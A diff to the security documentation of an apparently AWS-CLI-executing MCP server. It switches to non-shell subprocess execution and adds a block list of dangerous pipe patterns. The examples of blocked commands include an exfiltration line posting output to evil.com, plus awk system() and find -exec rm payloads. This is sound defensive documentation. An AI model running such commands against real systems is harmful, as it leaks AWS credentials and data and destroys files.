@@ -133,14 +133,16 @@ Security is paramount when executing commands against your AWS environment. Whil
 
 *   The server assumes the end-user interacting with the MCP client (e.g., Claude Desktop, Cursor) is the **same trusted individual** who configured the server and provided the least-privilege AWS credentials. Do not expose the server or connected client to untrusted users.
 
-**4. Understanding Execution Risks (Current Implementation)**
+**4. Understanding Execution Risks**
 
-*   **Command Execution:** The current implementation uses shell features (`shell=True` in subprocess calls) to execute AWS commands and handle Unix pipes. While convenient, this approach carries inherent risks if the input command string were manipulated (command injection).
-*   **Mitigation via Operational Controls:** In the context of the **trusted user model** and **Docker deployment**, these risks are mitigated operationally:
-    *   The trusted user is assumed not to provide intentionally malicious commands against their own environment.
-    *   Docker contains filesystem side-effects.
-    *   **Crucially, IAM least privilege limits the scope of *any* AWS action that could be executed.**
-*   **Credential Exfiltration Risk:** Despite containerization and IAM, a sophisticated command injection could potentially attempt to read the mounted credentials (`~/.aws`) or environment variables within the container and exfiltrate them (e.g., via `curl`). **Strict IAM policies remain the most vital defense** to limit the value of potentially exfiltrated credentials.
+*   **Command Execution:** The implementation uses safe subprocess execution (`asyncio.create_subprocess_exec`) which avoids shell injection vulnerabilities by not using `shell=True`. Commands are split using `shlex.split()` and executed with proper argument separation.
+*   **Command Validation:** All commands pass through a multi-layer security validation system that blocks dangerous operations before execution.
+*   **Unix Pipe Support:** When using pipes, each command in the chain is validated separately. The first command must be an AWS CLI command, and subsequent commands must be from a whitelist of allowed Unix utilities.
+*   **Residual Risks in Non-Docker Deployments:**
+    *   Without Docker isolation, piped commands like `curl`, `wget` could potentially be misused for data exfiltration
+    *   Filesystem commands (`rm`, `mv`, etc.) could affect the host system
+    *   **Docker deployment is strongly recommended** to contain these risks
+*   **Credential Security:** Despite containerization, credentials mounted or passed via environment variables could potentially be accessed within the container. **Strict IAM policies remain the most vital defense** to limit the value of potentially compromised credentials.
 
 **5. Network Exposure (SSE Transport)**
 
@@ -368,7 +370,9 @@ The server validates all AWS CLI commands through a three-layer system:
 3. **Pipe Command Security**:
    - Validates Unix commands used in pipes
    - Restricts commands to a safe allowlist
-   - Prevents filesystem manipulation and arbitrary command execution
+   - Prevents arbitrary command execution
+
+   **Note on Unix Commands**: The allowed Unix commands include networking tools (`curl`, `wget`, `ssh`) and filesystem commands (`rm`, `mv`) that are useful for AWS workflows but could potentially be misused. **Docker deployment is strongly recommended** as it isolates these operations from your host system. When running outside Docker, the server logs a security warning at startup.
 
 ### Default Security Configuration
 
@@ -421,6 +425,38 @@ Many read-only operations that match these patterns are explicitly allowed via s
 - All `get-`, `list-`, and `describe-` commands
 - All help commands (`--help`, `help`)
 - Simulation and testing commands (e.g., `aws iam simulate-custom-policy`)
+
+#### 5. Unix Command Injection Prevention
+
+Unix commands in pipes are validated for dangerous options that could enable arbitrary code execution:
+
+| Command | Blocked Patterns | Security Risk |
+|---------|-----------------|---------------|
+| `awk` | `system(`, `getline`, `\|"` | Shell command execution via awk |
+| `find` | `-exec`, `-execdir`, `-delete` | Arbitrary command execution on files |
+| `xargs` | (all usage blocked) | Designed to execute commands with piped input |
+| `sed` | `/e`, `;e` | GNU sed can execute shell commands |
+| `curl` | `-X POST`, `--data`, `-T` | Data exfiltration via HTTP POST/upload |
+| `wget` | `--post-data`, `--post-file` | Data exfiltration via HTTP POST |
+| `rm` | `-rf /`, `--no-preserve-root` | Destructive file system operations |
+| `chmod`/`chown` | Paths starting with `/etc`, `/usr` | System file permission changes |
+
+**Examples of blocked commands:**
+```bash
+# These pipe commands will be BLOCKED:
+aws s3 ls | awk 'BEGIN{system("malicious_command")}'  # awk system() blocked
+aws ec2 describe-instances | find . -exec rm {} \;    # find -exec blocked
+aws s3 ls | xargs anything                            # xargs completely blocked
+aws s3 ls | curl -X POST http://evil.com -d @-        # curl POST blocked
+```
+
+**Examples of allowed commands:**
+```bash
+# These pipe commands are ALLOWED:
+aws s3 ls | grep backup | sort                         # Safe text processing
+aws ec2 describe-instances | jq '.Reservations[]'      # Safe JSON processing
+aws s3 ls | head -10 | tail -5                         # Safe output limiting
+```
 
 ### Configuration Options
 
